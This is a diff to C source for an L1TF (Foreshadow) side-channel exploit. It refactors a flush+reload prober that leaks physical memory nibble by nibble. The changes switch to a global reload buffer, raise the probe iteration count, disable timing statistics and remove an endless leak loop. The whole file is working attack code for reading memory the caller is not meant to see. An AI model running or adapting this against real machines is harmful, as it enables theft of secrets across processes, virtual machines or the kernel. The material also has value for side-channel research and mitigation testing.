@@ -235,8 +235,8 @@ void l1tf_do_leak_nibblewise(const uintptr_t phys_addr, const size_t length) {
   for (int iter = 1; iter <= 10000; ++iter) {
     for (size_t i = 0, j = start; j < start + length; j += 1) {
       void *leak_addr = (char *)leak.leak + j;
-      size_t high = l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_high_nibble);
-      size_t low = l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_low_nibble);
+      size_t high = l1tf_do_leak_nibblewise_prober(leak_addr, asm_l1tf_leak_high_nibble);
+      size_t low = l1tf_do_leak_nibblewise_prober(leak_addr, asm_l1tf_leak_low_nibble);
       size_t result = ((high & 0x0f) << 4) | (low & 0x0f);
       results[i++] = result;
     }
@@ -493,19 +493,22 @@ static int hit[256];
 
 static __attribute__((aligned(PAGE_SIZE))) reload_buffer_t rlbuf;
 
-size_t l1tf_do_leak_nibblewise_prober(void *leak, reload_buffer_t *reload_buffer, void (*l1tf_leak_function)(void *, reload_buffer_t))
+size_t l1tf_do_leak_nibblewise_prober(void *leak, void (*l1tf_leak_function)(void *, reload_buffer_t))
 {
+#if 0
   static uint64_t count = 0;
   static uint64_t successful_hits = 0;
   static uint64_t start_time = -1;
   if (start_time == -1UL)
     start_time = clock_read();
+#endif
 
-  for (int i = 0; i < 100000; i++) {
-      flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, (void *)reload_buffer[0]);
-      l1tf_leak_function(leak, reload_buffer[0]);
-      ssize_t nibble = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, (void *)reload_buffer[0], THRESHOLD);
-
+  int i;
+  for (i = 0; i < 1000000; i++) {
+      flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, (void *)rlbuf);
+      l1tf_leak_function(leak, rlbuf);
+      ssize_t nibble = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, (void *)rlbuf, THRESHOLD);
+#if 0
       successful_hits += nibble > 0;
       // if (nibble > 0) printf("l1tf_do_leak_nibblewise_prober: leak = %p | probe_nr = %2lu | attempt = %3ld | nibble = %1lx\n", leak, probe_nr, attempt, nibble);
       #define PERIOD_ITERS 10000000
@@ -517,10 +520,13 @@ size_t l1tf_do_leak_nibblewise_prober(void *leak, reload_buffer_t *reload_buffer
         start_time = clock_read();
         successful_hits = 0;
       }
-
-      if (nibble > 0)
+#endif
+      if (nibble > 0) {
+        // printf("{%7d} ", i);
         return nibble;
+      }
     }
+    // printf("{%7d} ", i);
     return 0;
 }
 
@@ -536,20 +542,19 @@ void l1tf_do_leak(const uintptr_t phys_addr, const size_t length)
   size_t start = (phys_addr & 0xfff);
   assert(start + length < 0xfff);
 
-  while (1) {
-    for (int x = 0; x < 10; ++x) {
-      for (size_t i = 0, j = start; j < start + length; j += 1, i += 2) {
-        void *leak = (char *)leak_addr.leak + j;
-        size_t high = l1tf_do_leak_nibblewise_prober(leak, &rlbuf, asm_l1tf_leak_high_nibble) & 0xf;
-        size_t low = l1tf_do_leak_nibblewise_prober(leak, &rlbuf, asm_l1tf_leak_low_nibble) & 0xf;
+  for (int x = 0; x < 10; ++x) {
+    for (size_t i = 0, j = start; j < start + length; j += 1, i += 2) {
+      void *leak = (char *)leak_addr.leak + j;
+      size_t high = l1tf_do_leak_nibblewise_prober(leak, asm_l1tf_leak_high_nibble) & 0xf;
+      size_t low = l1tf_do_leak_nibblewise_prober(leak, asm_l1tf_leak_low_nibble) & 0xf;
 
-        // Count the number of times each result has occured
-        results[i][high]++;
-        results[i + 1][low]++;
-        printf("%1lx%1lx ", high, low);
-      }
-      printf("\n");
+      // Count the number of times each result has occured
+      results[i][high]++;
+      results[i + 1][low]++;
+      printf("%1lx%1lx ", high, low);
+      fflush(stdout);
     }
+    printf("\n");
   }
 
   free(results);
